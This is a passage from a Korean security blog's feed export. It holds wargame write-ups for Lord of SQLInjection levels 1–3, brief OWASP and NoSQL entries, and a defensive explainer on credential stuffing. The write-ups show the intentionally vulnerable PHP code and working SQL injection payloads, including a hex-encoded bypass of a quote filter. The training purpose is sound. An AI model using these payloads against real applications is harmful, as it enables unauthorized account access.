<p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">상세 페이지</a></p>
</div>

<br>

<br>

<hr>
<p><strong>참고</strong></p>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/OWASP/owasp.svg"></object>
<p>OWASP TOP 10</p><p>Open Web Application Security Project</p>
<a href="https://owasp.org/Top10/#whats-changed-in-the-top-10-for-2021"></a>
</div></div>

]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>OWASP</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [1번_gremlin] Write UP</title>
    <url>/2021/09/15/2021-09-15-Lord_of_SQLInjection_1_gremlin/</url>
    <content><![CDATA[<h1 id="📖-전체-소스코드"><a href="#📖-전체-소스코드" class="headerlink" title="📖 전체 소스코드"></a>📖 전체 소스코드</h1><br>

<p>1번 문제인 gremlin을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/gremlin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;gremlin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="✅-중요-소스코드-해석"><a href="#✅-중요-소스코드-해석" class="headerlink" title="✅ 중요 소스코드 해석"></a>✅ 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>일단 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
<br>

<hr>
<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<br>

<img src="/images/Lord of SQLInjection/gremlin/preg.png">

<br>

<br>

<hr>
<h2 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h2><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><p>세번째 줄은 쿼리문입니다.</p>
<p><code>id</code>와 <code>pw</code> 둘 중 하나를 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="🏁-SOLVE"><a href="#🏁-SOLVE" class="headerlink" title="🏁 SOLVE"></a>🏁 SOLVE</h1><br>

<p><code>id</code> 부분에 아무 문자를 넣고 <code>pw</code> 부분을 참으로 만들었습니다.<br><br><br></p>
<img src = "/images/Lord of SQLInjection/gremlin/solved.png">
<br><br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [2번_cobolt] Write UP</title>
    <url>/2021/09/16/2021-09-16-Lord_of_SQLInjection_2_cobolt/</url>
    <content><![CDATA[<h1 id="📕-전체-소스코드"><a href="#📕-전체-소스코드" class="headerlink" title="📕 전체 소스코드"></a>📕 전체 소스코드</h1><br>

<p>2번 문제인 cobolt을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/cobolt/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="❕❕-중요-소스코드-해석"><a href="#❕❕-중요-소스코드-해석" class="headerlink" title="❕❕ 중요 소스코드 해석"></a>❕❕ 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>1번 문제와 같이 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
<p>또한 <code>id</code> 파라미터가 <code>admin</code> 이어야 하는 <code>조건문</code>도 있습니다.</p>
<br>

<hr>
<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<br>

<img src="/images/Lord of SQLInjection/cobolt/preg.png">

<br>

<br>

<hr>
<h2 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h2><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><p>세번째 줄은 쿼리문입니다.</p>
<p><code>id</code>를 <code>admin</code>으로 만들어주는 동시에 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="🚩-SOLVE"><a href="#🚩-SOLVE" class="headerlink" title="🚩 SOLVE"></a>🚩 SOLVE</h1><br>

<p><code>id</code> 부분에 <code>admin&#39; or &#39;1&#39; = &#39;1</code>를 넣어주고 <code>pw</code>에 아무 문자를 넣어주었습니다.<br><br><br></p>
<img src = "/images/Lord of SQLInjection/cobolt/solved.png">
<br><br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL</title>
    <url>/2021/09/23/2021-09-23-NoSQL/</url>
    <content><![CDATA[<h1 id="🧶-NoSQL"><a href="#🧶-NoSQL" class="headerlink" title="🧶 NoSQL"></a>🧶 NoSQL</h1><br>

<p>NoSQL의 약자로는 <code>Not Only SQL</code>입니다.<br>NoSQL은 SQL과 다르게 <u>SQL을 사용하지 않고 데이터를 다룰 수 있다</u>는 의미를 가지고있습니다.</p>
<p><code>Netflix, Facebook, Twitter, Instagram</code> 등에서 NoSQL을 사용하고있습니다.</p>
<br>

<p>기존의 RDBMS SQL에서는 정해진 문법을 통해 데이터를 다루기 때문에 한 가지 언어로 다양한 DBMS를 사용할 수 있었습니다.</p>
<p>하지만 NoSQL은 <code>MongoDB, DynamoDB</code> 등 다양한 DBMS가 존재하기 때문에 각각의 구조와 문법을 알고있어야합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🍃-MongoDB"><a href="#🍃-MongoDB" class="headerlink" title="🍃 MongoDB"></a>🍃 MongoDB</h1><br>

]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>크레덴셜 스터핑 (Credential Stuffing)</title>
    <url>/2021/09/21/2021-09-21-%ED%81%AC%EB%A0%88%EB%8D%B4%EC%85%9C%20%EC%8A%A4%ED%84%B0%ED%95%91%20(Credential%20Stuffing)/</url>
    <content><![CDATA[<h1 id="🤔-크레덴셜-스터핑이란"><a href="#🤔-크레덴셜-스터핑이란" class="headerlink" title="🤔 크레덴셜 스터핑이란?"></a>🤔 크레덴셜 스터핑이란?</h1><br>

<mark class="label success">무차별 대입 공격(Brute force)</mark>과 <mark class="label info">사전 공격(Dictionary Attack)</mark> 등 과 마찬가지로 <u>사용자의 계정을 탈취</u>하는 공격 유형 중 하나입니다.

<mark class="label info">사전 공격(Dictionary Attack)</mark>과 다른 점은 <mark class="label info">사전 공격(Dictionary Attack)</mark>은 쓸만한 비밀번호를 사전처럼 모아두고 그 모아둔 목록을 자동화 공격 툴을 이용해 대입하는 공격이지만 <mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark>은 <u>이미 유출된 아이디와 비밀번호</u>를 이용해 다른 사이트에 자동화 기술로 대입하는 것입니다.

<br>

<br>

<h2 id="특징"><a href="#특징" class="headerlink" title="특징"></a>특징</h2><br>

<mark class="label success">무차별 대입 공격(Brute force)</mark>과 <mark class="label info">사전 공격(Dictionary Attack)</mark> 같은 경우 대입하는 횟수가 많아 탐지되기가 쉽지만 <mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark>은 <u>대입하는 횟수가 많지 않아</u> 탐지되기 쉽지 않고 눈에 띄지 않습니다.

<br>

<br>

<hr>
<br>

<h1 id="🧨-크레덴셜-스터핑-공격으로-인한-피해"><a href="#🧨-크레덴셜-스터핑-공격으로-인한-피해" class="headerlink" title="🧨 크레덴셜 스터핑 공격으로 인한 피해"></a>🧨 크레덴셜 스터핑 공격으로 인한 피해</h1><br>

<mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격에 성공한 공격자는 그 계정을 이용해 사기 범죄를 일으킬 수 있습니다.

<p>혹시나 탈취한 계정의 권한이 높거나 관리자의 계정일 경우에는 DB까지 만지거나 탈취 또한 가능하기 때문에 피해자는 큰 손해를 입습니다.</p>
<br>

<br>

<h2 id="크레덴셜-스터핑-피해-사례"><a href="#크레덴셜-스터핑-피해-사례" class="headerlink" title="크레덴셜 스터핑 피해 사례"></a>크레덴셜 스터핑 피해 사례</h2><br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안용어/크레덴셜 스터핑/logo.png"></object>
<p>크레덴셜 스터핑 피해 사례</p><p>보안뉴스</p>
<a href="https://www.boannews.com/media/view.asp?idx=83369&page=1&kind=1"></a>
</div></div>

<br>

<br>

<hr>
<br>

<h1 id="😄-크레덴셜-스터핑-방어-및-예방법"><a href="#😄-크레덴셜-스터핑-방어-및-예방법" class="headerlink" title="😄 크레덴셜 스터핑 방어 및 예방법"></a>😄 크레덴셜 스터핑 방어 및 예방법</h1><br>

<mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격의 방어와 예방법을 크게 두 가지로 나누어봤습니다.

<p>첫 번째는 <code>기업</code> 관점에서의 방어와 에방법 두 번째는 <code>사용자(개인)</code> 관점에서의 예방법으로 나누어봤습니다.</p>
<br>

<br>

<h2 id="기업-관점에서의-방법과-예방법"><a href="#기업-관점에서의-방법과-예방법" class="headerlink" title="기업 관점에서의 방법과 예방법"></a>기업 관점에서의 방법과 예방법</h2><br>

<ul>
<li><mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격은 자동화 툴을 이용해 공격하는게 일반적이므로 제한된 시간 안에 로그인 시도가 증가하고, 트래픽의 변화가 생기고, 평소보다 로그인 실패 빈도가 높아집니다.
그러므로 탐지를 통해 방어를 해야 합니다.</li>
<li>캡챠 같은 인증 방법을 통해 봇을 차단하는 방법이 있습니다.</li>
<li>2차 비밀번호와 같은 2단계 인증을 통해 예방을 합니다.<br>다중 인증 옵션을 사용 중인 계정의 해킹 방직 성공률은 99.9%라고 합니다.</li>
<li>회원 가입 시 비밀번호 조합을 강력하게 하도록 설정해두어야 합니다.</li>
</ul>
<br>

<br>

<h2 id="사용자-개인-관점에서의-예방법"><a href="#사용자-개인-관점에서의-예방법" class="headerlink" title="사용자(개인) 관점에서의 예방법"></a>사용자(개인) 관점에서의 예방법</h2><br>

<ul>
<li>사이트에 다중 인증 옵션이 있을 경우 사용합니다.</li>
<li>각 사이트 별로 다른 비밀번호를 사용해야 합니다.</li>
<li>비밀번호는 영문, 숫자, 특수 문자, 영어 대문자를 포함하여 강력하게 만들어야 합니다.</li>
</ul>
<br>

<br>

<h2 id="패스워드-모니터-기능"><a href="#패스워드-모니터-기능" class="headerlink" title="패스워드 모니터 기능"></a>패스워드 모니터 기능</h2><br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안용어/크레덴셜 스터핑/logo.png"></object>
<p>패스워드 모니터</p><p>보안뉴스</p>
<a href="https://www.boannews.com/media/view.asp?idx=97978"></a>
</div></div>

<br>

<p><strong>기사 내용 요약</strong></p>
<p>엣지 브라우저에서의 ‘패스워드 모니터’ 기능을 키면 다크웹 등 을 스캔해 사용자의 계정 정보가 유출됐는지 파악하고 그것을 알려 주는 기능이 있다고 알려 주는 내용입니다.</p>
]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [3번_goblin] Write UP</title>
    <url>/2021/09/27/2021-09-27-Lord_of_SQLInjection_3_goblin/</url>
    <content><![CDATA[<h1 id="😐-전체-소스코드"><a href="#😐-전체-소스코드" class="headerlink" title="😐 전체 소스코드"></a>😐 전체 소스코드</h1><br>

<p>3번 문제인 goblin을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/goblin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="💡-중요-소스코드-해석"><a href="#💡-중요-소스코드-해석" class="headerlink" title="💡 중요 소스코드 해석"></a>💡 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>이 있고 <code>id</code> 파라미터가 <code>admin</code> 이어야 하는 <code>조건문</code>도 있습니다.</p>
<br>

<br>

<h2 id="첫번째-amp-두번째-줄-해석"><a href="#첫번째-amp-두번째-줄-해석" class="headerlink" title="첫번째 &amp; 두번째 줄 해석"></a>첫번째 &amp; 두번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, <span class="variable">$_GET</span>[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 id에 <code>guest</code>를 고정해두고 <code>no</code>를 파라미터에서 받아오는 것을 볼 수 있습니다.</p>
<br>

<br>

<h2 id="네번째-amp-다섯번째-줄-해석"><a href="#네번째-amp-다섯번째-줄-해석" class="headerlink" title="네번째 &amp; 다섯번째 줄 해석"></a>네번째 &amp; 다섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>php에서 실행된 쿼리를 <code>result</code>변수에 넣습니다.</p>
<p><code>result[&#39;id&#39;]</code>가 <code>admin</code>이어야 하는 조건문이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🎉-SOLVE"><a href="#🎉-SOLVE" class="headerlink" title="🎉 SOLVE"></a>🎉 SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/goblin/guest.png">

<br>

<p><code>no</code> 파라미터에 <code>1</code>을 넣었더니 Hello guest가 나오는 것을 보아 <code>1</code>은 guest 값인 것을 알 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 예상 DB</span></span><br><span class="line"></span><br><span class="line">+-------+----+</span><br><span class="line">| id    | no |</span><br><span class="line">+-------+----+</span><br><span class="line">| guest | <span class="number">1</span>  |</span><br><span class="line">| admin | ?  |</span><br><span class="line">+-------+----+</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><code>no</code>파라미터를 조작해서 쿼리문의 <code>id</code>값을 <code>admin</code>으로 바꿔줘야 합니다.</p>
<p><code>?no=2 or id=&#39;admin&#39;</code>으로 조작을 시도하면 두번째 줄의 <code>preg_match</code> 함수로 필터링이 됩니다.</p>
<br>

<br>

<p><code>&#39;admin&#39;</code>을 <code>16진수</code>로 변환하여 넣었습니다.</p>
<p><code>admin</code>을 <code>16진수</code>로 변환하면 아래와 같이 나옵니다.</p>
<img src="/images/Lord of SQLInjection/goblin/hex.png">

<br>

<br>

<p><code>?no=2 or id=0x61646d696e</code>을 해주니 <code>id</code>가 <code>admin</code>이 됐습니다.</p>
<img src="/images/Lord of SQLInjection/goblin/solved.png">

<br>

<br>

<p>쿼리문에 <code>select id from prob_goblin where id=&#39;guest&#39; and no=2 or id=0x61646d696e</code> 이렇게 들어가면</p>
<p><code>id=&#39;gest&#39; and no=2</code>는 거짓이 되고 <code>id=0x61646d696e</code>가 들어가게 됩니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [4번_orc] Write UP</title>
    <url>/2021/09/28/2021-09-28-Lord_of_SQLInjection_4_orc/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>4번 문제인 orc를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orc/source.png">

<br>

